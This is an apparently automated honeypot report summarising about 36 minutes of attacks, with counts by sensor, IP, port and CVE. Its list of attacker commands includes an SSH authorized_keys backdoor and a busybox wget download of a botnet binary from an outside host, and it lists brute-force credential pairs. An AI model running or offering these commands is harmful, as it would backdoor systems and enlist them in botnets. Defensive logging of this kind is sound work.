Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-29T14:57:18Z
**Timeframe:** 2025-09-29T14:20:01Z to 2025-09-29T14:56:34Z
**Files Used:** agg_log_20250929T142001Z.json, agg_log_20250929T144001Z.json, agg_log_20250929T145634Z.json

**Executive Summary**

This report summarizes honeypot activity over a period of approximately 36 minutes. A total of 7,377 attacks were recorded across various honeypots. The most targeted services were SSH (Cowrie) and other services captured by Honeytrap. The majority of attacks originated from a diverse set of IP addresses, with a significant concentration from a few specific sources. Attackers primarily attempted to gain unauthorized access and deploy malware.

**Detailed Analysis**

*   **Our IPs:**
    *   Not specified in logs.

*   **Attacks by Honeypot:**
    *   Cowrie: 2515
    *   Honeytrap: 1887
    *   Ciscoasa: 1448
    *   Suricata: 1255
    *   Dionaea: 53
    *   Tanner: 38
    *   ConPot: 32
    *   Dicompot: 27
    *   Mailoney: 22
    *   Redishoneypot: 21
    *   Sentrypeer: 21
    *   H0neytr4p: 19
    *   Adbhoney: 15
    *   Honeyaml: 13
    *   ElasticPot: 11

*   **Top Source Countries:**
    *   Not specified in logs.

*   **Top Attacking IPs:**
    *   39.107.106.103: 1270
    *   185.156.73.167: 374
    *   185.156.73.166: 374
    *   92.63.197.55: 361
    *   92.63.197.59: 335
    *   103.140.249.62: 177
    *   152.32.129.236: 149
    *   107.174.26.130: 144
    *   85.209.134.43: 124
    *   185.255.91.28: 114

*   **Top Targeted Ports/Protocols:**
    *   22: 448
    *   8333: 121
    *   80: 39
    *   9443: 39
    *   TCP/22: 23
    *   23: 23
    *   TCP/80: 22
    *   9000: 20
    *   TCP/1521: 14
    *   20000: 12
    *   TCP/1433: 12

*   **Most Common CVEs:**
    *   CVE-2021-44228
    *   CVE-2002-0013
    *   CVE-2002-0012
    *   CVE-2019-11500
    *   CVE-2021-3449
    *   CVE-2016-20016
    *   CVE-1999-0517
    *   CVE-2018-11776
    *   CVE-2006-2369

*   **Commands Attempted by Attackers:**
    *   cd ~; chattr -ia .ssh; lockr -ia .ssh
    *   lockr -ia .ssh
    *   cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
    *   cat /proc/cpuinfo | grep name | wc -l
    *   Enter new UNIX password:
    *   cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
    *   free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
    *   which ls
    *   ls -lh $(which ls)
    *   crontab -l
    *   w
    *   uname -m
    *   cat /proc/cpuinfo | grep model | grep name | wc -l
    *   top
    *   uname
    *   uname -a
    *   whoami
    *   lscpu | grep Model
    *   df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
    *   cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...

*   **Signatures Triggered:**
    *   Not specified in logs.

*   **Users / Login Attempts:**
    *   345gs5662d34/345gs5662d34
    *   minecraft/server
    *   myuser/12345
    *   git/P@ssw0rd
    *   ww/ww123
    *   root/zhbjETuyMffoL8F
    *   root/whoami
    *   zxg/zxg
    *   tob/tob
    *   admin/admin@123
    *   ... and numerous others with single attempts.

*   **Files Uploaded/Downloaded:**
    *   Not specified in logs.

*   **HTTP User-Agents:**
    *   Not specified in logs.

*   **SSH Clients and Servers:**
    *   Not specified in logs.

*   **Top Attacker AS Organizations:**
    *   Not specified in logs.

**Key Observations and Anomalies**

*   A high volume of automated attacks targeting SSH (port 22) is ongoing, with attackers attempting to brute-force credentials.
*   Multiple attackers were observed attempting to download and execute malicious shell scripts and binaries, such as `w.sh`, `c.sh`, and `arm.urbotnetisass`, indicating attempts to install malware or add the server to a botnet.
*   Attackers are using sophisticated commands to gather system information, manipulate SSH authorized keys, and escalate privileges.
*   The presence of CVE-2021-44228 (Log4Shell) indicates that attackers are still actively exploiting this vulnerability.
